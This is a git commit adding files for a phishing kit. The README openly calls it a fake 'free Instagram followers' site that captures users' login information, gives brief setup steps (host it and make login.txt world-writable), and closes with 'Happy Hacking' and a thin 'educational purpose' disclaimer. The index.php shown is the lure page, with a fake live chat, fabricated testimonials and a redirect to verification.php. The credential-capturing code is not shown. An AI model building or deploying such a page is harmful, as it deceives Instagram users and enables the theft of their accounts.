93509b7a18bf7efbc8bf933024bad0317e348110
it4min - LinuxArmy <51884521+it4min@users.noreply.github.com>
2021-11-21 18:18:32 +0330

    Add files via upload

--- README.md
+++ README.md
@@ -1,2 +1,16 @@
-# instagram-phishing
-insta
+# Fake-Instagram-Follower-Phishing-
+It is simple layout which looks like a free instagram follower increasing site but actually its a phishing page which captures the login info of users.
+
+# Demo
+https://xploitwizer.me/InstaFollowers  (Not Available)
+
+How to use :
+> just host it on a hosting and change permission of login.txt to 777
+
+
+# Happy Hacking 
+
+### XploitWizer Provides no warranty with this software and will not be responsible for any direct or indirect damage caused due to the usage of this tool.
+### Instagram-Follower-Phishing is built for Educational Purpose. Use at your own Risk.
+
+# Team XploitWizer 
---
+++ index.php
@@ -0,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Free Instagram Followers</title>
+    <link href="css/_bower.css" rel="stylesheet">
+    <link href="css/sweetalert.css" rel="stylesheet">
+    <link href="css/style.css" rel="stylesheet">
+  </head>
+  <body>
+    <div class="container">
+      <div id="generator"></div>
+      <div class="transparent-box">
+        <div class="row">
+          <div class="col-md-12">
+            <h2>Live Chat</h2>
+            <div class="row">
+              <div class="col-md-8 col-md-offset-2">
+                <div class="livechatBox">
+                  <div class="livechatNameBox">
+                    <div class="overlay"></div>
+                    <div class="nameInputBox">
+                      <div class="form-group">
+                        <label for="livechat_name">Nickname</label>
+                        <input id="livechat_name" type="text" placeholder="Enter nickname..." class="form-control livechatName">
+                      </div>
+                      <button class="btn btn-success btn-block livechatNicknameBtn">Submit</button>
+                    </div>
+                  </div>
+                  <div class="row">
+                    <div class="col-md-12">
+                      <div class="heading">
+                        <h3>Instagram Room</h3>
+                      </div>
+                    </div>
+                  </div>
+                  <div class="row">
+                    <div class="col-md-12">
+                      <div class="livechatListArea">
+                        <ul class="chatList"></ul><br class="clearfix">
+                      </div>
+                    </div>
+                  </div>
+                  <div class="row">
+                    <div class="col-md-10">
+                      <input type="text" placeholder="Enter message..." class="form-control input-lg livechatMsg">
+                    </div>
+                    <div class="col-md-2">
+                      <button class="btn btn-success btn-block btn-lg livechatSubmtBtn">Submit</button>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div><br class="clearfix">
+      </div>
+      <div class="transparent-box">
+        <div class="row">
+          <div class="col-md-12">
+            <h2>Testimonials</h2>
+          </div>
+        </div>
+        <div class="row">
+          <div class="col-sm-4">
+            <div class="person-review"><img src="img/person-1.jpg" class="avatar">
+              <h3>William Roman</h3><img src="img/will.png" class="proof img-responsive">
+            </div>
+          </div>
+          <div class="col-sm-4">
+            <div class="person-review"><img src="img/person-2.jpg" class="avatar">
+              <h3>Lori Coates</h3><img src="img/lori.png" class="proof img-responsive">
+            </div>
+          </div>
+          <div class="col-sm-4">
+            <div class="person-review"><img src="img/person-4.jpg" class="avatar">
+              <h3>Giovanna Jett</h3><img src="img/gio.png" class="proof img-responsive">
+            </div>
+          </div>
+        </div><br>
+      </div>
+    </div>
+    <footer class="footer">
+      <div class="container">
+        <p class="text-muted">&copy; Copyright 2021 - Present. All rights reserved.</p>
+      </div>
+    </footer>
+    <script>
+	    function letsgo() {
+		    window.location = 'verification.php';
+	    }
+    </script>
+    <script src="js/scripts.js"></script>
+    <script src="react/vendors.js"></script>
+    <script src="react/app.js"></script>
+</body>
+</html>
